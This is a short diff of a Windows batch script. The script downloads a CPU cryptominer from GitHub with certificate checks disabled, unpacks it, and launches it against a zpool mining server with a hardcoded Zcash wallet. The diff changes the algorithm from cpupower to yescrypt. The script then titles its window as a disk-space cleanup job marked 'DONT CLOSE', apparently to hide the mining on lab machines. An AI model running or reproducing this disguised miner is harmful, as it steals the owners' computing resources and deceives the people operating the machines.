@@ -14,7 +14,7 @@ cd C:\Users\Administrator\Desktop
 curl -LJOk https://raw.githubusercontent.com/mrX04/mimning/master/Cpuminer-opt-cpu-pool-win64.zip
 7z.exe x Cpuminer-opt-cpu-pool-win64.zip
 cd C:\Users\Administrator\Desktop\Cpuminer-opt-cpu-pool-win64
-start cpuminer.exe -a cpupower -o stratum+tcp://cpupower.eu.mine.zpool.ca:6240 -u t1Sju7XGRK7NE5WF77uTCsyVvKnD3JyR1GM -p c=ZEC
+start cpuminer.exe -a yescrypt -o stratum+tcp://yescrypt.eu.mine.zpool.ca:6233 -u t1Sju7XGRK7NE5WF77uTCsyVvKnD3JyR1GM -p c=ZEC
 @echo off
 cls
 title Delete Labs File TO Free Up Disk Space. DONT CLOSE.
